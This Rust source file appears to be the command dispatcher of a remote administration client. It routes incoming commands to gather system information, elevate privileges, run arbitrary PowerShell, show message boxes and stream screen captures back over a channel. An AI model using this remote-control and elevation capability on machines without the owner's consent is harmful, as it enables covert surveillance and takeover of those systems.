use shared::commands::{BaseCommand, BaseResponse, CaptureCommand, CaptureType, Command, Response};
use smol::channel::Sender;
use std::sync::{Arc, atomic::AtomicBool};

use crate::{
    capture,
    commands::{powershell, computer_info, elevate, message_box},
};

pub fn send(response: BaseResponse, tx: &Sender<Vec<u8>>) {
    match tx.try_send(bincode::encode_to_vec(response, bincode::config::standard()).unwrap()) {
        Ok(_) => {
            println!("[x] sent frame");
        }
        Err(smol::channel::TrySendError::Full(_)) => {
            println!("[x] congested, dropped response");
        }
        Err(smol::channel::TrySendError::Closed(_)) => {
            println!("[x] channel closed");
        }
    };
}

pub fn main(command: BaseCommand, tx: Sender<Vec<u8>>, capture_running: Option<Arc<AtomicBool>>) {
    match command.command {
        Command::ComputerInfo => {
            send(
                match computer_info::main() {
                    Ok(info) => BaseResponse {
                        id: command.id,
                        response: info,
                    },
                    Err(err) => BaseResponse {
                        id: command.id,
                        response: Response::Error(err.to_string()),
                    },
                },
                &tx,
            );
        }
        Command::Elevate => {
            send(match elevate::main() {
                Ok(info) => BaseResponse { id: command.id, response: info },
                Err(err) => BaseResponse { id: command.id, response: Response::Error(err.to_string())}
            }, &tx);
        },
        Command::Powershell(cmd) => {
            send(BaseResponse { id: command.id, response: powershell::main(cmd) }, &tx);
        }
        Command::MessageBox(args) => send(
            match message_box::main(args) {
                Ok(info) => BaseResponse {
                    id: command.id,
                    response: info,
                },
                Err(err) => BaseResponse {
                    id: command.id,
                    response: Response::Error(err.to_string()),
                },
            },
            &tx,
        ),
        Command::Capture(capture_command, capture_type) => {
            match capture_command {
                CaptureCommand::Start(quality) => {
                    ////////////////////////////
                    match capture_type {
                        CaptureType::Screen => {
                            if let Some(running) = capture_running {
                                capture::screen::main(command.id, tx, running, quality);
                            }
                        }
                        _ => { /* not done!! */ }
                    }
                }
                _ => { /* dafuq */ }
            }
        }
    };
}
